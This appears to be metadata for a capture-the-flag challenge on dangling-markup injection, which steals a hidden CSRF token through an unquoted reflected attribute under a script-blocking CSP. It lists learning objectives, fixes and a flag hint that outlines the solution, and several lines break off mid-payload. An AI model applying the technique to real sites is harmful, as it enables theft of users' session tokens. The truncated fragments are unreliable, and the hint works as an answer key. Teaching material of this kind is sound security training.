title: Dangling Markup — Stealing a CSRF Token Without Executing JS
learning_objectives: Understand dangling-markup injection: an unterminated tag/attribute (a resource URL left open) swallows the following page source into a request the browser sends — a scriptless exfiltration primitive
Recognise that a strict CSP (script-src 'none') stops
Exploit a raw reflection into an UNQUOTED attribute (URL context): x>

Know the modern constraint: Chrome's dangling-markup mitigation blocks a resource URL formed across a NEWLINE, so the capture only works when the token sits on the same source line (verified live in Chromium 131)

Apply the fixes: contextually encode reflected values (never raw into an unquoted attribute), always quote attributes, keep secrets off pages that reflect untrusted input, and add a CSP that would still block this (e.g. restrictive img-src / connect-src)
flag_hint: The staff /page?u= reflects u RAW into an UNQUOTED attribute on a single line, under CSP script-src 'none', with a hidden CSRF token further along the line. Queue POST /report {"url":"/page?u=x>
tech_stack: raw reflection into an UNQUOTED attribute on a single-line template + CSP script-src 'none'
hidden CSRF token in an <input value> (captured as source text by the dangling markup)
inspired_by: The dangling-markup / trailing-markup injection technique (Michal Zalewski / Gareth Heyes / PortSwigger dangling-markup research) for scriptless data theft under a script-blocking CSP, abstracted for local Docker with a Flask reflect-into-unquoted-attribute page, a Playwright admin bot, and an OOB collector
